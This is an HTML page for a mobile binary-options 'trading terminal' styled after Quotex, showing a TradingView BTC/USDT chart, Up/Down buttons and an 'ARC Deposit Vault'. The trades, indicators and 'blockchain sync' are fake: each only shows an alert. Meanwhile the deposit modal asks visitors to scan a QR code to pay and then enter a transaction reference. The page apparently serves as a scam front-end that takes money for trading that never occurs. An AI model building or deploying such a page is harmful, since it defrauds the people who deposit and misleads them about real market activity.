<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>THE ARCHITECT | Binary Pro Terminal</title>
    <style>
        :root { --gold: #d4af37; --black: #090b0e; --green: #00c853; --red: #ff3d00; --blue: #2979ff; --dark-grey: #1c1f26; }
        body { background: var(--black); color: white; font-family: 'Roboto', sans-serif; margin: 0; overflow: hidden; height: 100vh; user-select: none; }
        
        /* Top Navigation - Quotex Style */
        .top-nav { display: flex; justify-content: space-between; align-items: center; padding: 10px 15px; background: var(--dark-grey); border-bottom: 1px solid #2d333b; height: 55px; box-sizing: border-box; }
        .bal-pill { background: rgba(212,175,55,0.1); border: 1px solid var(--gold); padding: 5px 12px; border-radius: 4px; font-weight: bold; font-size: 14px; }
        .dep-btn { background: var(--green); color: white; border: none; padding: 8px 20px; border-radius: 4px; font-weight: bold; font-size: 13px; }

        /* Main Chart Area - Full Frame */
        #chart-zone { height: calc(100vh - 240px); width: 100%; position: relative; background: var(--black); }
        
        /* Manual Indicators Toolset */
        .side-tools { position: absolute; top: 20px; left: 15px; z-index: 100; display: flex; flex-direction: column; gap: 10px; }
        .tool-btn { background: var(--dark-grey); border: 1px solid #444; color: white; padding: 8px; border-radius: 4px; font-size: 10px; cursor: pointer; transition: 0.3s; }
        .active-ind { border-color: var(--gold); color: var(--gold); background: rgba(212,175,55,0.1); }

        /* Timer & Selection (1M, 2M, 5M) */
        .time-selector { display: flex; gap: 5px; margin-bottom: 10px; }
        .t-chip { flex: 1; background: #252930; border: 1px solid #444; padding: 10px; border-radius: 5px; font-size: 12px; text-align: center; font-weight: bold; }
        .selected-t { border-color: var(--blue); color: var(--blue); background: rgba(41, 121, 255, 0.1); }

        /* Trading Pad - Bottom UI */
        .trade-pad { position: fixed; bottom: 0; width: 100%; background: var(--dark-grey); padding: 15px; border-top: 1px solid #2d333b; box-sizing: border-box; z-index: 2000; }
        .asset-info { display:flex; justify-content:space-between; font-size:12px; color:#8b949e; margin-bottom:10px; }
        
        .action-row { display: flex; gap: 12px; }
        .btn-main { flex: 1; padding: 18px; border: none; border-radius: 10px; font-size: 20px; font-weight: 900; text-transform: uppercase; cursor: pointer; }
        .up { background: var(--green); box-shadow: 0 4px 0 #008a39; color: black; }
        .down { background: var(--red); box-shadow: 0 4px 0 #ba2d00; color: white; }

        /* ARC Vault Modal */
        .modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: var(--dark-grey); border: 2px solid var(--gold); padding: 25px; border-radius: 15px; z-index: 5000; width: 88%; text-align: center; }
        .modal img { background: white; padding: 10px; border-radius: 10px; margin-bottom: 15px; }
        .modal input { width: 90%; padding: 12px; background: #111; border: 1px solid #333; color: white; border-radius: 8px; margin-bottom: 15px; }
    </style>
</head>
<body>

<div class="top-nav">
    <div class="bal-pill"><span style="color:var(--gold)">LIVE</span> ₹0.00</div>
    <button class="dep-btn" onclick="openM('vault')">DEPOSIT</button>
</div>

<div id="chart-zone">
    <div class="side-tools">
        <button class="tool-btn" id="zig-btn" onclick="toggleInd('zig-btn', 'ZIGZAG')">IND: ZIGZAG</button>
        <button class="tool-btn" id="rsi-btn" onclick="toggleInd('rsi-btn', 'RSI')">IND: RSI</button>
        <button class="tool-btn" id="all-btn" onclick="toggleInd('all-btn', 'ALLIGATOR')">IND: ALLIGATOR</button>
        <button class="tool-btn" onclick="alert('Timeframe: 1 Minute')">1M</button>
    </div>
    
    <div id="tv_main_chart" style="height:100%;"></div>
</div>

<div class="trade-pad">
    <div class="time-selector">
        <div class="t-chip selected-t" onclick="selT(this)">1 MIN</div>
        <div class="t-chip" onclick="selT(this)">2 MIN</div>
        <div class="t-chip" onclick="selT(this)">5 MIN</div>
    </div>
    
    <div class="asset-info">
        <span>BTC/USDT <span style="color:var(--gold)">85% Payout</span></span>
        <span>Invest: ₹100</span>
    </div>

    <div class="action-row">
        <button class="btn-main up" onclick="execTrade('UP')">↑ Up</button>
        <button class="btn-main down" onclick="execTrade('DOWN')">↓ Down</button>
    </div>
</div>

<div id="vault" class="modal">
    <h3 style="color:var(--gold); margin-top:0;">ARC DEPOSIT VAULT</h3>
    <img src="https://raw.githubusercontent.com/americankinga-a11y/ARCHITECT/main/1000006609.png" width="200">
    <p style="font-size:11px; color:#8b949e;">Scan QR to sync assets. Verification takes 5-10 mins.</p>
    <input type="text" placeholder="Enter Transaction UTR">
    <button class="dep-btn" style="width:100%;" onclick="alert('Syncing with Blockchain... Please wait.')">CONFIRM ASSETS</button>
    <p onclick="closeM('vault')" style="color:#555; font-size:12px; margin-top:15px; cursor:pointer;">Close Terminal</p>
</div>

<script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
<script>
    // Professional Binary Chart Setup
    new TradingView.widget({
        "width": "100%", "height": "100%", "symbol": "BINANCE:BTCUSDT",
        "interval": "1", "theme": "dark", "style": "1", "container_id": "tv_main_chart",
        "hide_top_toolbar": true, "backgroundColor": "#090b0e", "hide_legend": true,
        "withdateranges": false, "save_image": false, "enable_publishing": false
    });

    // Manual Indicator Toggle Logic
    function toggleInd(btnId, name) {
        const btn = document.getElementById(btnId);
        btn.classList.toggle('active-ind');
        if(btn.classList.contains('active-ind')) {
            alert(name + " Indicator Applied to Live Feed.");
        } else {
            alert(name + " Indicator Removed.");
        }
    }

    // Fixed Time Selection (1M, 2M, 5M)
    function selT(el) {
        document.querySelectorAll('.t-chip').forEach(c => c.classList.remove('selected-t'));
        el.classList.add('selected-t');
    }

    // Trade Execution Simulation
    function execTrade(dir) {
        const duration = document.querySelector('.selected-t').innerText;
        alert(`Order Placed: ${dir} | Duration: ${duration}\nAnalyzing market majority logic...`);
    }

    // Modal Control
    function openM(id) { document.getElementById(id).style.display = 'block'; }
    function closeM(id) { document.getElementById(id).style.display = 'none'; }
</script>
</body>
</html>
